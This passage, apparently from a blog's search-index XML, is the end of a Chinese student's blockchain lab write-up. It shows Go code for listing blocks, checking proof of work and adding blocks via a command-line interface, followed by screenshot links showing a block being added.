pow := NewProofOfWork(block)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;PoW: %s\n&quot;</span>, strconv.FormatBool(pow.Validate()))</span><br><span class="line">		fmt.Println()</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(block.PrevHash) == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">list_blocks</span><span class="params">()</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bci := bc.Iterator()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		block := bci.Next()</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">		pow := NewProofOfWork(block)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;PoW: %s\n&quot;</span>, strconv.FormatBool(pow.Validate()))</span><br><span class="line">		fmt.Println()</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(block.PrevHash) == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bc.AddBlock(data)</span><br><span class="line">	fmt.Print(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cli_mode</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	foostr := flag.NewFlagSet(<span class="string">&quot;newblock&quot;</span>,flag.ExitOnError)</span><br><span class="line">	strValue := foostr.String(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;string&quot;</span>,<span class="string">&quot;打印字符串&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> os.Args[<span class="number">1</span>] &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;newblock&quot;</span>:</span><br><span class="line">		foostr.Parse(os.Args[<span class="number">2</span>:])</span><br><span class="line">		Add(*strValue)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;listblocks&quot;</span>:</span><br><span class="line">		list_blocks()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;expected &#x27;str&#x27; subcommands&quot;</span>)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实验截图：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102111924062.png" alt="image-20211102111924062"></p>
<p>添加区块。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102112149554.png" alt="image-20211102112149554"></p>
<p>可以看到区块已经被成功添加进来。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102112214484.png" alt="image-20211102112214484"></p>
]]></content>
  </entry>
</search>
